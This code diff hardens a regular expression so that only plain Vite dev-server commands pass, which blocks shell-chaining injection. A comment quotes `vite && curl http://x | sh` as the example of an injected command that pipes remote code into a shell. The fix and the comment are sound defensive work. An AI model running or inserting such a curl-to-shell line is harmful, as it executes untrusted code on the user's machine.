@@ -74,8 +74,18 @@ export function resolveDevScript(appRoot: string): DevScript | null {
   }
 }
 
-/** `vite`, `vite dev --port 4000`, `npx vite`, `bunx vite`, `pnpm exec vite`, `yarn vite` — and nothing else. */
-const VITE_INVOCATION = /^\s*(?:(?:npx|bunx|pnpm|yarn)\s+(?:exec\s+)?)?vite(?:\s|$)/
+/**
+ * `vite`, `vite dev --port 4000`, `npx vite`, `bunx vite --host 127.0.0.1`,
+ * `pnpm exec vite`, `yarn vite` — and nothing else. Anchored at BOTH ends:
+ * `npm run` hands the whole script string to a shell, so a rule that only
+ * checked the start would have run `vite && curl http://x | sh` (`sec-21`).
+ * Everything after the `vite` token has to be a bounded flag/argument token —
+ * letters, digits, `_ . / : = -` — which admits every real Vite flag and no
+ * shell metacharacter: no `; & | < >`, no quotes, no backticks, no `$(`.
+ * Running `vite` still evaluates the project's own `vite.config.*`; that is
+ * what Tier 2 means, not a gap this rule pretends to close.
+ */
+const VITE_INVOCATION = /^\s*(?:(?:npx|bunx|pnpm|yarn)\s+(?:exec\s+)?)?vite(?:\s+[\w./:=-]+)*\s*$/
 
 export function resolveLiveCapability(dir: string): LiveCapability {
   const script = resolveDevScript(resolveAppRoot(dir))
